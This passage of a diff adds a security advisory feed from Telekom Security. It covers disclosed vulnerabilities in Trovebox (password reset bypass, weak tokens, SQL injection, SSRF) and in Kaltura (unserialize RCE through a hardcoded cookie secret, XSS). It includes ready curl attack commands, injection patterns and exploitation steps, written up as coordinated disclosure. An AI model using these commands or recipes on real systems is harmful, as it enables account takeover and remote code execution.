+    because the email address is not used here. By using an empty string (&quot;&quot;) as
+    the password token, the password can then be changed.
+
+    Example:
+
+      $ curl localhost/user/password/reset.json \
+      -d &quot;token=&amp;amp;password=x&amp;amp;password-confirm=x&quot;
+      {&quot;message&quot;:&quot;Password was updated successfully.&quot;,&quot;code&quot;:200,&quot;result&quot;:true}
+
+
+  2) Unsafe password reset token generation
+
+    The password reset token generation is not random enough:
+
+      //ApiUserController.php, L59
+      $token = md5(rand(10000,100000));
+
+    There are only 90.000 different tokens which is trivial to crack in a 
+    short time frame.
+
+
+  3) SQL injection in album list function
+
+    The buildQuery() function in DatabaseMySql.php fails to validate the 'album'
+    parameter.
+
+    Example: /photos/album-1'[SQL]/list 
+    Example: /photos/album/list?album=1'[SQL] 
+
+
+  4) Server-Side request forgery in webhook subscription functionality
+
+    The webhook subscribe function does not sufficient filter the passed
+    callback url, thus allowing an authenticated user to access internal services
+    and hosts.
+
+    Example contacting a local SSHd:
+
+      $ curl -XPOST pwnbox:8080/webhook/subscribe \
+      -d &quot;mode=GET&amp;amp;topic=a&amp;amp;callback=dict://127.0.0.1::22/?&quot; \
+      --cookie &quot;PHPSESSID=jm6adsphu75m8kna0drkhj9nj4&quot; 
+      The verification call failed to meet requirements. Code: 0, Response: SSH-
+      2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 Protocol mismatch.
+      , Expected: 5a7f6cfc81a78, URL: dict://127.0.0.1:22/?mode=GET&amp;amp;topic=a&amp;amp;challenge=5a7f6cfc81a78
+
+
+References:
+
+    [1]: https://github.com/photo/frontend
+
+Disclosure Timeline:
+
+  11. February     2018 - Details sent to core contributor.
+  21. March        2018 - Contributor pushed first patches.
+  26. April        2018 - Patch merged.
+  30. April        2018 - Advisory published.
+
+About Telekom Security:
+
+  Telekom Security is the security provider for Deutsche Telekom and Deutsche
+  Telekom customers.
+
+  https://security.telekom.com
+  https://github.com/telekomsecurity
+  http://www.sicherheitstacho.eu
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Telekom Security</name></author><summary type="html">Trovebox, a photo sharing and management application, is prone to several critical vulnerabilities. Exploiting is trivial and it is recommended to update to the fixed version from Github.</summary></entry><entry><title type="html">Kaltura Video Platform - Pre-Auth Remote Code Execution (and XSS)</title><link href="http://telekomsecurity.github.io//2017/09/kaltura-rce.html" rel="alternate" type="text/html" title="Kaltura Video Platform - Pre-Auth Remote Code Execution (and XSS)" /><published>2017-09-12T00:00:00+02:00</published><updated>2017-09-12T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2017/09/kaltura-rce</id><content type="html" xml:base="http://telekomsecurity.github.io//2017/09/kaltura-rce.html">&lt;p&gt;During an interal pentest several critical vulnerabilities could be identified
+in the latest version of &lt;a href=&quot;https://kaltura.com&quot;&gt;Kaltura Community and Enterprise&lt;/a&gt;.
+The vulnerabilities were fixed in the latest release 13.2.0.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; A proof of concept exploit can be found &lt;a href=&quot;/assets/exploits/kaltura_rce_poc_2017-14143.py&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20170912_kaltura-advisory.txt&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                          Telekom Security
+                        security.telekom.com
+
+     Advisory: Kaltura - Remote Code Execution and Cross-Site Scripting
+ Release Date: 2017/09/12
+       Author: Robin Verton (robin.verton@telekom.de)
+          CVE: CVE-2017-14141, CVE-2017-14142, CVE-2017-14143
+
+  Application: Kaltura &amp;lt;= 13.1.0
+         Risk: Critical
+Vendor Status: Kaltura 13.2.0 was released to fix this vulnerabilities.
+
+Overview:
+
+  Quote from Wikipedia:
+  &quot;Kaltura is a New York-based software company founded in 2006. Kaltura states
+   that its mission is to power any video experience. Kaltura operates in four
+   major markets for video based solutions: Cloud TV (AKA OTT TV) for operators
+   and media companies, OVP (Online Video Platform) offered mostly to media
+   companies and brands looking to distribute content or monetize it, EdVP
+   (Education Video Platform) offered to educational institutions who are
+   increasingly relying on video as for teaching and learning, and EVP
+   (Enterprise Video Platform) offered to enterprises who use video for
+   collaboration, communications and marketing.&quot;
+
+  Kaltura is installed on a lot of high profiles website like banking websites,
+  universities, manufacturers, multimedia corporations etc.
+
+  Multiple vulnerabilities were identified in the current release of the
+  Kaltura Video platform. It was discovered that Kaltura passes unfiltered user
+  input to unserialize(), leading to the execution of PHP code. One of this
+  vulnerabilities can also be triggered unauthenticated. Several other
+  Cross-Site Scripting vulnerabilities were found.
+
+Details:
+
+  1) Unauthenticated Remote Code Execution through unserialize() from cookie data
+
+    Because of a hardcoded cookie secret, the cookie signature validation can
+    be bypassed and malicious user input can be passed via the 'userzone' cookie
+    to the unserialize() function:
+
+    abstract class kalturaAction extends sfAction
+    {
+        private $cookieSecret = 'y3tAno3therS$cr3T';
+
+        // [...]
+        
+        protected function getUserzoneCookie() 
+        {
+            $cookie = $this-&amp;gt;getContext()-&amp;gt;getRequest()-&amp;gt;getCookie('userzone');
+            $length = strlen($cookie);
+            if ($length &amp;lt;= 0)
+                return null;
+                
+            $serialized_data = substr($cookie, 0, $length - 32);
+            $hash_signiture = substr($cookie, $length - 32);
+                 
+            // check the signiture
+            if (md5($serialized_data . $this-&amp;gt;cookieSecret) != $hash_signiture)
+                return null;
+            
+            $userzone_data = unserialize(base64_decode($serialized_data));
+
+    To pass this validation the base64 encoded serialized object has to be
+    hashed and this hash appended to the encoded data. A Zend Framework POP
+    chain [1] can then be used to execute PHP code when unserializing. When
+    using PHP7 a different chain has to be used because the e-modifier for
+    preg_replace is not available anymore.
+
+    To execute the getUserzoneCookie() function the getAllEntriesAction has to
+    be called with a valid entry ID. This ID can be obtained from any public
+    video object which is embedded and typically begins with '0_'.
+
+  2) Authenticated Remote Code Execution through unserialize() in the admin panel
+
+    The admin panel provides a few 'Developer System Helper' functions to
+    encode/decode user supplied data. The 'wiki_decode' function will take user
+    input and pass it nearly untouched to unserialize():
+
+    // slightly formatted for better readability
+    if ( $algo == &quot;wiki_encode&quot; )
+	{
+		$res = str_replace(
+            array ( &quot;|&quot; , &quot;/&quot;) , array (&quot;|01&quot; , &quot;|02&quot;),
+            base64_encode(serialize($str))
+        ); 
+	}
+
+    By passing a base64 encoded malicious serialized object, PHP code can be
+    executed.
+
+  3) Multiple Cross-Site Scripting vulnerabilities under the API path
+
+    A few cross-site scripting vulnerabilities were found earlier this year and
+    fixed [2]. However, this fix was insufficient because PHPs strip_tags()
+    function only strips tags and is not adequate to secure against XSS
+    vulnerabilities. There are a few places where this can be exploited to
+    inject javascript code:
+
+    // server/admin_console/web/tools/bigRedButton.php, line 8
+    $partnerId = strip_tags($_GET['partnerId']);
+
+    // [...]
+
+    &amp;lt;script&amp;gt;
+		var partnerId = &amp;lt;?php echo $partnerId; ?&amp;gt;;
+
+    As can be seen above no tags need to be inserted here to execute javascript
+    code. A simple partnerId=alert(1) will be executed in this scenario. This
+    also affects a few other files.
+
+    server/admin_console/web/tools/bigRedButton.php
+        - $_GET['partnerId']
+        - $_GET['playerVersion']
+
+    server/admin_console/web/tools/bigRedButtonPtsPoc.php
+        - $_GET['partnerId']
+        - $_GET['playerVersion']
+        - $_GET['secret']
+        - $_GET['entryId']
+        - $_GET['adminUiConfId']
+        - $_GET['uiConfId']
+
+    server/admin_console/web/tools/AkamaiBroadcaster.php
+        - $_GET['streamUsername']
+        - $_GET['streamPassword']
+        - $_GET['streamRemoteId']
+        - $_GET['streamRemoteBackupId']
+        - $_GET['entryId']
+
+    server/admin_console/web/tools/XmlJWPlayer.php
+        - $_GET['entryId']
+
+    server/alpha/web/lib/bigRedButtonPtsPocHlsjs.php
+        - $_GET['partnerId']
+        - $_GET['playerVersion']
+
+Additional notes:
+
+  The already published Server Side Request Forgery attack [3] was not fixed
+  properly, because only an additional check for the http(s) protocol was added.
+  This still allows to talk to some backend services (like the memcached) or
+  other machines. There is a whitelist in place to make this more secure, but I
+  could not find a way how to set this up. This is likely responsible for a
+  lot of insecure default installations of Kaltura in the wild.
+
+References:
+
+  [1]: https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf
+  [2]: https://github.com/kaltura/server/pull/5304/files
+  [3]: http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf
+
+Recommendation:
+
+  It is recommended to upgrade to the latest version of Kaltura.
+
+Disclosure Timeline:
+
+  16. August     2017 - Notified vendor
+  22. August     2017 - Remote Command Execution vulnerabilities fixed
+  05. September  2017 - Cross-Site scripting vulnerabilities fixed
+  11. September  2017 - Kaltura 13.2.0 released
+  12. September  2017 - Released advisory
+
+About Telekom Security:
+
+  Telekom Security is the security provider for Deutsche Telekom and Deutsche Telekom customers.
+
+  https://security.telekom.com
+  https://telekomsecurity.github.io
+  http://www.sicherheitstacho.eu
+  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Telekom Security</name></author><summary type="html">During an interal pentest several critical vulnerabilities could be identified in the latest version of Kaltura Community and Enterprise. The vulnerabilities were fixed in the latest release 13.2.0. Update: A proof of concept exploit can be found here.</summary></entry></feed>
